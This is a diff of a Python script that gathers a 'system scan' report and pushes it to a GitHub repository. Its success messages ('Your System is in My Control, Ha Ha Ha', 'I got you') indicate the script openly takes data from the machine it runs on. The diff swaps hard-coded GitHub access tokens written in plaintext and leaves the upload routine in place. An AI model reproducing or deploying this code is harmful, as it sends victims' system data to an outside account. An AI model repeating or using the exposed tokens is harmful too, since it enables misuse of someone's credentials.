@@ -30,7 +30,7 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = "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"
 REPO_NAME = "amrita425/System_Scan_files"
 BRANCH = "main"
 
@@ -1715,13 +1715,13 @@ def push_to_github():
         html_content = generate_html_report()
 
         # Initialize GitHub connection
-        GITHUB_TOKEN = "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"
+        GITHUB_TOKEN = "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"
         auth = Auth.Token(GITHUB_TOKEN)
         g = Github(auth=auth)
         repo = g.get_repo(REPO_NAME)
 
         # Create filename with timestamp
-        filename = f"System_Scan_Report_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}_v18.html"
+        filename = f"System_Scan_Report_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}.html"
 
         # Create commit message
         commit_message = f"Add system scan report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
@@ -1746,8 +1746,6 @@ def push_to_github():
 if __name__ == "__main__":
     success = push_to_github()
     if success:
-        print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
+        print("\033[96mI got you\033[0m")
     else:
-
         print("\033[91mFailed to push to GitHub\033[0m")
-
